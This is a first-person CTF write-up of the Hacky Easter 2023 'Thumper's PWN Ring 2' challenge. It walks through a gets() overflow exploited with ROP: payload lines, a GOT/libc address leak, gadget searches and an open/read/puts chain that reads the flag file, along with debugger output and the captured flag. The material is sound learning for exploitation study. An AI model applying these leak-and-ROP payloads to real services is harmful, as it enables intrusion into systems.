# Description

# Thumper's PWN - Ring 2

Thumper got one step closer to Dr. Evil but there's still a lot he has to learn. That's why he's practicing the ancient
art of ROP. Help him solve this challenge by reading the file FLAG, so he can be on his way.

Target: `nc ch.hackyeaster.com 2314`

Note: The service is restarted every hour at x:00.

# Solution

so this is a rop challenge, and we got the c file...

so we don't have the correct libc so it is not a return to libc (after solving it i can say... this is wrong)

also apparently we are restricted in the systemcalls we are allowed to make, so with open and read we can open the flag, and then we could use the plt to print something!

this is my first challenge using `pwndbg` a gdb plugin, so maybe things are easier with it

first i set a breakpoint in the vuln function

```
pwndbg> break vuln
Breakpoint 1 at 0x400715
```

then i tried to get the address of a string:

```
pwndbg> disassemble $rip
Dump of assembler code for function vuln:
   0x0000000000400711 <+0>:     push   rbp
   0x0000000000400712 <+1>:     mov    rbp,rsp
=> 0x0000000000400715 <+4>:     sub    rsp,0x20
   0x0000000000400719 <+8>:     lea    rdi,[rip+0x228]        # 0x400948
   0x0000000000400720 <+15>:    call   0x400550 <puts@plt>
   0x0000000000400725 <+20>:    lea    rdi,[rip+0x235]        # 0x400961
   0x000000000040072c <+27>:    mov    eax,0x0
   0x0000000000400731 <+32>:    call   0x400570 <printf@plt>
   0x0000000000400736 <+37>:    lea    rax,[rbp-0x20]
   0x000000000040073a <+41>:    mov    rdi,rax
   0x000000000040073d <+44>:    mov    eax,0x0
   0x0000000000400742 <+49>:    call   0x400590 <gets@plt>
   0x0000000000400747 <+54>:    nop
   0x0000000000400748 <+55>:    leave
   0x0000000000400749 <+56>:    ret
End of assembler dump.
pwndbg> x/s 0x400948
0x400948:       "Are you a master of ROP?"
```

so my first self made task was printing one of the strings again!

getting all the plt offsets of functions:

```
pwndbg> plt
Section .plt 0x400540-0x4005a0:
0x400550: puts@plt
0x400560: setbuf@plt
0x400570: printf@plt
0x400580: prctl@plt
0x400590: gets@plt
```

also someone posted this link in the discord which really helped:

<https://tc.gts3.org/cs6265/2021/tut/tut06-02-advrop.html>

i also had ropper installed!

so i got the gadget to fill the registers for my printf!

```
$ ropper --file main --search "pop rdi; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret

[INFO] File: main
0x0000000000400803: pop rdi; ret; 
```

so my first payload was this:

```
s.send(b"A" * 32 + b"aaaabbbb" + p64(pop_rdi_gadget) + p64(0x400948) + p64(printf_plt))
```

it apparently sort of worked... but not fully

```
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007f7787d6f474 in __printf (format=0x400948 "Are you a master of ROP?") at ./stdio-common/printf.c:28
28      ./stdio-common/printf.c: No such file or directory.
```

when trying the same with puts it just worked?!

```
s.send(b"A" * 32 + b"aaaabbbb" + p64(pop_rdi_gadget) + p64(0x400948) + p64(puts_plt))
```

```
$ python3 solve.py 
[+] Starting local process './main': pid 5328

[*] Switching to interactive mode
 $ 
Are you a master of ROP?
```

to verify if i was doing things right i also tried this remotely, and it worked!

```
$ python3 solve.py 
[+] Opening connection to ch.hackyeaster.com on port 2314: Done

[*] Switching to interactive mode
 $ 
Are you a master of ROP?
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
$ 
$ quit
[*] Closed connection to ch.hackyeaster.com port 2314
[*] Got EOF while sending in interactive
```

after some time i was able to leak a got address and run the main function again!

viewing the got addresses:

```
pwndbg> got
GOT protection: Partial RELRO | GOT functions: 5
[0x601018] puts@GLIBC_2.2.5 -> 0x400556 (puts@plt+6) ◂— push 0 /* 'h' */
[0x601020] setbuf@GLIBC_2.2.5 -> 0x7ffff7e43160 (setbuf) ◂— mov edx, 0x2000
[0x601028] printf@GLIBC_2.2.5 -> 0x400576 (printf@plt+6) ◂— push 2
[0x601030] prctl@GLIBC_2.2.5 -> 0x7ffff7ece0e0 (prctl) ◂— sub rsp, 0x58
[0x601038] gets@GLIBC_2.2.5 -> 0x400596 (gets@plt+6) ◂— push 4
```

```
s.send(b"A" * 40 + p64(pop_rdi_gadget) + p64(puts_got) + p64(puts_plt) + p64(ret_gadget) + p64(main_func_addr) + b"\n")
```

```
$ python3 solve.py 
[+] Starting local process './main': pid 5448

[*] Switching to interactive mode
  x.\x822\x7f
Are you a master of ROP?
Show me what you can do: $ 
[*] Got EOF while reading in interactive
$ 
[*] Process './main' stopped with exit code -11 (SIGSEGV) (pid 5448)
[*] Got EOF while sending in interactive
```

checking if the addresses are the same, to do so i attached gdb to the same process:

```
b'  X\xaa\x98\x93\x7f\nAre you a master of ROP?\nShow me what you can do:'

pwndbg> p puts
$1 = {int (const char *)} 0x7f9398aa5820 <__GI__IO_puts>
```

a second time just to verify:

```
b'  \xe8\xa0\x81\xda\x7f\nAre you a master of ROP?\nShow me what you can do:'

pwndbg> p puts
$1 = {int (const char *)} 0x7fda81a0e820 <__GI__IO_puts>
```

this link looks promising!!

<https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address>

so i leaked the address remotely!

```
python3 solve.py 
[+] Opening connection to ch.hackyeaster.com on port 2314: Done

b' p\x99^\xae[\x7f\nAre you a master of ROP?\nShow me what you can do:'
[*] Switching to interactive mode
 $ 
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
$ 
$ 
[*] Closed connection to ch.hackyeaster.com port 2314
[*] Got EOF while sending in interactive
```

the following writeup also looks nice :)

<https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/pwn/Reject%20humanity%20return%20to%20libc>

so i did the same also remotely:

```
$ python3 solve.py 
[+] Opening connection to ch.hackyeaster.com on port 2314: Done

0xfd5c7970
[*] Switching to interactive mode
 $ 
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
$ 
$ 
[*] Closed connection to ch.hackyeaster.com port 2314
[*] Got EOF while sending in interactive
```

this website gave me: <https://libc.blukat.me/>

```
libc6-amd64_2.23-0ubuntu11.2_i386
libc6-amd64_2.23-0ubuntu11.3_i386
libc6_2.27-3ubuntu1.5_amd64
libc6_2.27-3ubuntu1.6_amd64
```

also leaking printf:

```
$ python3 solve.py 
[+] Opening connection to ch.hackyeaster.com on port 2314: Done

puts leak: 0x7fccc4b91970
printf leak: 0x7fccc4b75e40
[*] Switching to interactive mode
 $ 
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
$ 
$ 
[*] Closed connection to ch.hackyeaster.com port 2314
[*] Got EOF while sending in interactive
```

using the program from hacktricks: i got my right libc version!

```
$ ./find puts 0x7f1b84a08820 printf 0x7f1b849e3450
kali-glibc (libc6_2.36-8_amd64)
kali-glibc (libc6_2.36-9_amd64)
kali-glibc (libc6-amd64_2.36-8_i386)
kali-glibc (libc6-amd64_2.36-9_i386)

$ ldd --version
ldd (Debian GLIBC 2.36-9) 2.36
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

the program gave me the same results as the website!

```
./find puts 0x7fccc4b91970 printf 0x7fccc4b75e40
ubuntu-glibc (libc6_2.27-3ubuntu1.5_amd64)
ubuntu-glibc (libc6_2.27-3ubuntu1.6_amd64)
```

trying to get the address of open locally:

```
pwndbg> p open
$1 = {int (const char *, int, ...)} 0x7f52b38b3d50 <__libc_open64>
pwndbg> p puts
$2 = {int (const char *)} 0x7f52b3833820 <__GI__IO_puts>


$ python3 solve.py 
[+] Starting local process './main': pid 27189
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

puts leak: 0x7f52b3833820
calculates libc base: 0x7f52b37bc000
libc open: 0x7f52b38b3d50
[*] Switching to interactive mode
 $ 
$ 
[*] Got EOF while reading in interactive
$ 
[*] Process './main' stopped with exit code -11 (SIGSEGV) (pid 27189)
[*] Got EOF while sending in interactive
```

it matches!!!

after debugging it really worked... the problem now is to get the "FLAG" string inside open as argument...

and i don't find anything

searching for strings gave me a bit, but not much since they are not terminated after the "G"

```
$ strings -a -t x libc-2.27.so | grep "FLAG"
 1b7b40 s->_flags2 & _IO_FLAGS2_FORTIFY

$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "FLAG"
 19e840 (_res_hconf.flags & HCONF_FLAG_MULTI) != 0
```

this is also a writeup using everything i used till now, so for challenges i face later on

<https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/pwn/Reject%20humanity%20return%20to%20libc>

so i found the place where the filename was stored, i can maybe overwrite it!

```
pwndbg> info proc map
process 29380
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
            0x400000           0x401000     0x1000        0x0  r-xp   /root/Documents/CTFs/HackyEaster/Hacky_Easter_2023/Level7/Thumpers_PWN_Ring_2/main
            0x600000           0x601000     0x1000        0x0  r--p   /root/Documents/CTFs/HackyEaster/Hacky_Easter_2023/Level7/Thumpers_PWN_Ring_2/main
            0x601000           0x602000     0x1000     0x1000  rw-p   /root/Documents/CTFs/HackyEaster/Hacky_Easter_2023/Level7/Thumpers_PWN_Ring_2/main
      0x7ffff7dc2000     0x7ffff7dc5000     0x3000        0x0  rw-p   
      0x7ffff7dc5000     0x7ffff7deb000    0x26000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7deb000     0x7ffff7f40000   0x155000    0x26000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7f40000     0x7ffff7f93000    0x53000   0x17b000  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7f93000     0x7ffff7f97000     0x4000   0x1ce000  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7f97000     0x7ffff7f99000     0x2000   0x1d2000  rw-p   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7f99000     0x7ffff7fa6000     0xd000        0x0  rw-p   
      0x7ffff7fc3000     0x7ffff7fc5000     0x2000        0x0  rw-p   
      0x7ffff7fc5000     0x7ffff7fc9000     0x4000        0x0  r--p   [vvar]
      0x7ffff7fc9000     0x7ffff7fcb000     0x2000        0x0  r-xp   [vdso]
      0x7ffff7fcb000     0x7ffff7fcc000     0x1000        0x0  r--p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
      0x7ffff7fcc000     0x7ffff7ff1000    0x25000     0x1000  r-xp   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
      0x7ffff7ff1000     0x7ffff7ffb000     0xa000    0x26000  r--p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
      0x7ffff7ffb000     0x7ffff7ffd000     0x2000    0x30000  r--p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
      0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x32000  rw-p   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rw-p   [stack]
pwndbg> find 0x600000,0x601000,"main"
0x6003f3
1 pattern found.
pwndbg> x/s 0x6003f3
0x6003f3:       "main"
```

ropgadget can give some really nice stuff!!

```
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --ropchain
```

this is only a small part of its output... but this is how i could write `FLAG` into the open argument!!

```
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x4e132 mov qword ptr [rsi], rdx ; ret
        [+] Gadget found: 0x28ed9 pop rsi ; ret
        [+] Gadget found: 0xfdc9d pop rdx ; ret
        [-] Can't find the 'xor rdx, rdx' gadget. Try with another 'mov [reg], reg'

        [+] Gadget found: 0x122c2d mov qword ptr [rsi], rdi ; ret
        [+] Gadget found: 0x28ed9 pop rsi ; ret
        [+] Gadget found: 0x27725 pop rdi ; ret
        [-] Can't find the 'xor rdi, rdi' gadget. Try with another 'mov [reg], reg'

        [+] Gadget found: 0x9ea31 mov qword ptr [rdx], rcx ; ret
        [+] Gadget found: 0xfdc9d pop rdx ; ret
        [+] Gadget found: 0x101e17 pop rcx ; ret
        [-] Can't find the 'xor rcx, rcx' gadget. Try with another 'mov [reg], reg'

        [+] Gadget found: 0x352ec mov qword ptr [rdx], rax ; ret
        [+] Gadget found: 0xfdc9d pop rdx ; ret
        [+] Gadget found: 0x3f0a7 pop rax ; ret
        [+] Gadget found: 0xaf7c5 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0xaf7c5 xor rax, rax ; ret
        [+] Gadget found: 0xc23d0 add rax, 1 ; ret
        [+] Gadget found: 0x9ba6b add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x27725 pop rdi ; ret
        [+] Gadget found: 0x28ed9 pop rsi ; ret
        [+] Gadget found: 0xfdc9d pop rdx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x26428 syscall

- Step 5 -- Build the ROP chain
```

so i actually used one gadget to write `FLAG` to the memory!

a writeup which got me this idea was this one:

<https://gist.github.com/rverton/42340ee4bd3482c6262db2bc9bbb9ef5>

i used this gadget for that:

```
[+] Gadget found: 0x122c2d mov qword ptr [rsi], rdi ; ret
```

because it was also available in the remote libc!

```
- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x14007d mov qword ptr [rsi], rdi ; ret
        [+] Gadget found: 0x23a6a pop rsi ; ret
        [+] Gadget found: 0x2164f pop rdi ; ret
        [-] Can't find the 'xor rdi, rdi' gadget. Try with another 'mov [reg], reg'
```

so i also got the hint that the file i needed to read was `/FLAG` not `FLAG`, but this is not a problem with my setup!

so what i did to achieve that was, writing `/FLAG` on the stack, and poping it to rdi, after that i found a writeable address using `vmmap` in gdb

i popped that address to rsi and then called the gadget to move this, and now i could just provide the writeable address to open!

using vmmap to view address spaces and permissions:

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r-xp     1000      0 /root/Documents/CTFs/HackyEaster/Hacky_Easter_2023/Level7/Thumpers_PWN_Ring_2/main
          0x600000           0x601000 r--p     1000      0 /root/Documents/CTFs/HackyEaster/Hacky_Easter_2023/Level7/Thumpers_PWN_Ring_2/main
          0x601000           0x602000 rw-p     1000   1000 /root/Documents/CTFs/HackyEaster/Hacky_Easter_2023/Level7/Thumpers_PWN_Ring_2/main
    0x7f8c7b120000     0x7f8c7b123000 rw-p     3000      0 [anon_7f8c7b120]
```

i also struggeled a long time to get read to run, but it did not work because i always provided readonly addresses!!

so now i looked at that i provided a random address from this range (i looked before if there was anything in there, but it was empty)

```
0x601000 - 0x602000
```

now that also read did work (i just provided the 3 parameters)

as last step i had to print the flag, i just used the same technique as with leaking the got values in the first place, just with my new address i saved the flag to!

now i tried it locally and it magically worked!

```
$ python3 solve.py 
[+] Starting local process './main': pid 3732
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

puts leak: 0x7f3ea2e3c820
calculates libc base: 0x7f3ea2dc5000
libc open: 0x7f3ea2ebcd50
[*] Switching to interactive mode
 testflag

Are you a master of ROP?
Show me what you can do: $ 
[*] Got EOF while reading in interactive
$ 
[*] Process './main' stopped with exit code -11 (SIGSEGV) (pid 3732)
[*] Got EOF while sending in interactive
```

now i also took the libc gadget offsets for the remote libc and just tried it, and it actually worked!!!

```
$ python3 solve.py 
[+] Opening connection to ch.hackyeaster.com on port 2314: Done
[*] '/root/Documents/CTFs/HackyEaster/Hacky_Easter_2023/Level7/Thumpers_PWN_Ring_2/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

puts leak: 0x7fb1ffceb970
calculates libc base: 0x7fb1ffc6b000
libc open: 0x7fb1ffd7abf0
[*] Switching to interactive mode
 Unfortunately, no one can be told what the Matrix is.
You have to see it for yourself.
This is your last chance.
After this there is no turning back.

Here is your flag:

he2023{N0t_bad_y0u_bypa$$ed_th3_s3c_f1lt3r}


Are you a master of ROP?
Show me what you can do: $ 
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
$ 
$ 
[*] Closed connection to ch.hackyeaster.com port 2314
[*] Got EOF while sending in interactive
```

# FLAG: he2023{N0t_bad_y0u_bypa$$ed_th3_s3c_f1lt3r}
